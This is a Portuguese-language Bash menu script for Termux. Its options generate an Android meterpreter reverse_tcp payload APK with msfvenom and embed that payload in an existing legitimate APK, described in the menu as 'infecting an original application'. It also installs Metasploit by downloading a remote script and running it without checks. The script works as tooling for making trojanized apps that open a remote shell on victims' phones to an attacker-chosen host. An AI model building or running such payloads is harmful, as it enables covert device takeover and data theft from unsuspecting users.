#!/bin/bash

COR0="$(printf '\033[1;37m')"
COR1="$(printf '\033[1;31m')"
COR2="$(printf '\033[1;32m')"
COR3="$(printf '\033[1;36m')"
COR4="$(printf '\033[1;34m')"
COR5="$(printf '\033[1;33m')"
COR6="$(printf '\033[1;35m')"


clear;

exit_on_signal_SIGINT() {
        { printf "\n\n%s\n\n" "${COR1}[×] VOCÊ APERTOU CTRL+C. O PROGRAMA FOI INTERROMPIDO!" 2>&1; }
        exit 0
}

exit_on_signal_SIGTERM() {
        { printf "\n\n%s\n\n" " Program Terminated." 2>&1; }
        exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

mensagem_sair() {
	sleep 2;
	echo "${COR5}[ ~ ] ASSIM QUE PRECISAR, ESTAREI AQUI! "
	echo ""
	echo ""
}

criar_apk() {
	read -p "${COR1}==> ${COR2} INFORME SEU HOST: ${COR0}" LHOST
	read -p "${COR1}==> ${COR2} INFORME A PORTA: ${COR0}" LPORT
	read -p "${COR1}==> ${COR2} QUAL O NOME PARA O NOVO APK: ${COR0}" NOME
	echo ""
	echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} CRIANDO O APK, POR FAVOR AGUARDE!"
	echo ""
	msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} R > ${NOME}
	sleep 3;
	echo ""
	echo "${COR2}[ ${COR4}# ${COR2}]${COR2} O APK FOI CRIADO COM SUCESSO!!"
	echo ""
	read -p "${COR2}[ ${COR4}:: ${COR2}]${COR2} DEVO MOVÊ-LO PARA A MEMÓRIA INTERNA ${COR1}(SIM / NÃO): ${COR0}" RESPO
		if [[ "$RESPO" == SIM || "$RESPO" == sim || "$RESPO" == Sim ]]; then
			echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} MOVENDO O APK PARA MEMÓRIA INTERNA"
			sleep 3;
			mv ${NOME} /sdcard
			echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} O APK FOI MOVIDO COM SUCESSO! ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
			echo ""
		else
			sleep 3;
			echo ""
        		echo "${COR2} OK! O APK NÃO SERÁ MOVIDO!"
			echo ""
		fi
}

infectar_apk() {
        read -p "${COR1}==> ${COR2} QUAL O CAMINHO PARA O APK ORIGINAL: ${COR0}" CAMIN
        read -p "${COR1}==> ${COR2} QUAL SEU HOST: ${COR0}" LHOST
        read -p "${COR1}==> ${COR2} QUAL A PORTA: ${COR0}" LPORT
        read -p "${COR1}==> ${COR2} QUAL O NOME PARA O NOVO APK: ${COR0}" NOME
        echo ""
        echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} CRIANDO O APK, POR FAVOR AGUARDE!"
        echo ""
        msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -x ${CAMIN} -k apk R > ${NOME}
        echo ""
	echo "${COR2}[ ${COR4}# ${COR2}]${COR2} O APK FOI CRIADO COM SUCESSO!!"
        echo ""
        read -p "${COR2}[ ${COR4}:: ${COR2}]${COR2} DEVO MOVÊ-LO PARA A MEMÓRIA INTERNA ${COR1}(SIM / NÃO): ${COR0}" RESPO
                if [[ "$RESPO" == SIM || "$RESPO" == sim || "$RESPO" == Sim ]]; then
                        echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} MOVENDO O APK PARA MEMÓRIA INTERNA"
                        sleep 3;
                        mv ${NOME} /sdcard
			echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} O APK FOI MOVIDO COM SUCESSO! ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
			echo ""
		else
                        sleep 3;
                        echo ""
                        echo "${COR2} OK! O APK NÃO SERÁ MOVIDO!"
                        echo ""
                fi
}

instalar_metasploit() {
	echo ""
	echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} CRIANDO O DIRETÓRIO ${COR2}[ ${COR4}:: ${COR2}]${COR2}"
	echo ""
	cd /data/data/com.termux/files/usr/
	mkdir -p opt
	cd /data/data/com.termux/files/usr/opt
	mkdir -p metasploit-framework
	sleep 4;
	echo ""
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} DIRETÓRIO CRIADO ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	echo ""
	sleep 2;
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} INSTALANDO DEPENDÊNCIAS ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	echo ""
	apt install ncurses-utils
	pkg install wget curl openssh git -y
	pkg install wget
	echo""
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} DEPENDÊNCIAS INSTALADAS ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	sleep 2;
	echo ""
	echo "${COR2}[ ${COR4}:: ${COR2}]${COR2} INCIANDO A INSTALAÇÃO DO METASPLOIT ${COR2}[ ${COR4}:: ${COR2}]${COR2}"
	echo ""
	wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
	chmod +x metasploit.sh
	./metasploit.sh


}


instalar_apktool() {
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} AGUARDE! VERIFICANDO APKTOOL NO SISTEMA... ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	{ sleep 2; }
		if [[ -e /data/data/com.termux/files/usr/bin/apktool.jar ]]; then
			rm -rf /data/data/com.termux/files/usr/bin/apktool.jar ]]
			if [[ -e /data/data/com.termux/files/usr/bin/apktool ]]; then
				rm -rf /data/data/com.termux/files/usr/bin/apktool
			fi
		else
			echo ""
			echo "${COR2}[ ${COR4}+ ${COR2}]${COR1} O APKTOOL NÃO ESTÁ INSTALADO!"
			{ sleep 2; echo; }
		fi
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} INCIANDO A INSTALAÇÃO DO APKTOOL ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	sleep 2;
	echo ""
		if [[ -e /data/data/com.termux/files/home/Termux-Sploit/apktool-2.7.1 ]]; then
			cp /data/data/com.termux/files/home/Termux-Sploit/apktool-2.7.1/* /data/data/com.termux/files/usr/bin
			cd /data/data/com.termux/files/usr/bin/
			chmod +x *
		fi
	{ sleep 6; echo; }
	echo "${COR2}[ ${COR4}+ ${COR2}]${COR2} ABRA UMA NOVA SESSÃO NO TERMUX E DIGITE ${COR1}apktool ${COR2}[ ${COR4}+ ${COR2}]${COR2}"
	{ sleep 3; echo; }
}

banner() {

	cat <<- EOF
		${COR0}
		${COR0}+-------------------------------------------------------+
		${COR0}|                AUTOR: VICTOR SILVA                    |
		${COR0}+---------------------------+---------------------------+
		${COR0}|${COR4}      __________________   ${COR0}|                           ${COR0}|
		${COR0}|${COR5}  ==c${COR4}(______(${COR5}o${COR4}(______(_${COR5}()  ${COR0}| ${COR2}|""""""""""""|======[${COR1}***  ${COR0}|
		${COR0}|${COR4}             )${COR5}=${COR4}\           ${COR0}| ${COR2}|   ${COR0}TERMUX   ${COR2}\            ${COR0}|
		${COR0}|${COR4}            // \\           ${COR0}| ${COR2}|_____________\_______    ${COR0}|
		${COR0}|${COR4}           //   \\          ${COR0}| ${COR2}|==[${COR0}msf >${COR2}]============\   ${COR0}|
		${COR0}|${COR4}          //     \\         ${COR0}| ${COR2}|______________________\  ${COR0}|
		${COR0}|${COR4}         //${COR0} LINUX ${COR4}\\        ${COR0}| ${COR2}\(@)(@)(@)(@)(@)(@)(@)/   ${COR0}|
		${COR0}|${COR4}        //         \\       ${COR0}|  ${COR2}*********************    ${COR0}|
		${COR0}+---------------------------+---------------------------+
		${COR0}|      o O o                ${COR0}|        ${COR5}\'\/\/\/'/         ${COR0}|
		${COR0}|              o O          ${COR0}|         ${COR5})${COR0}======${COR5}(          ${COR0}|
		${COR0}|                 o         ${COR0}|       ${COR5}.'  ${COR0}HACK  ${COR5}'.        ${COR0}|
		${COR0}| ${COR1}|^^^^^^^^^^^^^^|l___      ${COR0}|      ${COR5}/    ${COR2}_||__   ${COR5}\       ${COR0}|
		${COR0}| ${COR1}|   ${COR0}METASPLOIT   ${COR1}|${COR3}""\ ${COR1}___,${COR0}|     ${COR5}/    ${COR2}(_||_     ${COR5}\      ${COR0}|
		${COR0}| ${COR1}|________________|__|)__| ${COR0}|    ${COR5}|     ${COR2}__||_)     ${COR5}|     ${COR0}|
		${COR0}| ${COR1}|(@)(@)"""**|(@)(@)**|(@) ${COR0}|    ${COR5}"       ${COR2}||       ${COR5}"     ${COR0}|
		${COR0}|  ${COR5}= = = = = = = = = = = =  ${COR0}|     ${COR5}'--------------'      ${COR0}|
		${COR0}+---------------------------+---------------------------+
		${COR2}			${COR2}[ ${COR4}+ ${COR2}] ${COR2}VERSÃO : ${COR0}1.0
		${COR2}			${COR2}[ ${COR4}+ ${COR2}] ${COR2}SCRIPT CRIADO POR: ${COR0}VICTOR SILVA
		${COR2}
		${COR2}
		${COR2}
		${COR2}[ ${COR4}::${COR2} ]${COR2} ESCOLHA UMA DAS OPÇÕES ABAIXO PARA PROSSEGUIR: ${COR2}[ ${COR4}:: ${COR2}]${COR2}

		${COR2}[ ${COR4}01 ${COR2}]${COR2} CRIAR UM PAYLOAD COM METASPLOIT
		${COR2}[ ${COR4}02 ${COR2}]${COR2} INFECTAR UM APLICATIVO ORIGINAL
		${COR2}[ ${COR4}03 ${COR2}]${COR2} INSTALAR O METASPLOIT NO TERMUX
		${COR2}[ ${COR4}04 ${COR2}]${COR2} INSTALAR O APKTOOL NO TERMUX
		${COR2}[ ${COR4}05 ${COR2}]${COR2} SAIR DO SCRIPT

	EOF

	echo ""
	read -p "${COR2}[ ${COR4}+ ${COR2}]${COR2} SELECIONE A OPÇÃO: ${COR0}" OPCAO
		echo ""
        	case $OPCAO in
                	1 | 01)
                        	criar_apk;;
			2 | 02)
				infectar_apk;;
			3 | 03)
				instalar_metasploit;;
			4 | 04)
				instalar_apktool;;
                	5 | 05)
				mensagem_sair;;
			*)
                        	echo "${COR2}[ ${COR1}! ${COR2}]${COR1} NÃO CORRESPONDE A NENHUMA OPÇÃO, TENTE NOVAMENTE! ${COR2}[ ${COR1}! ${COR2}]"
  				echo ""
				{ sleep 2; clear; banner; };;
        esac
}

banner
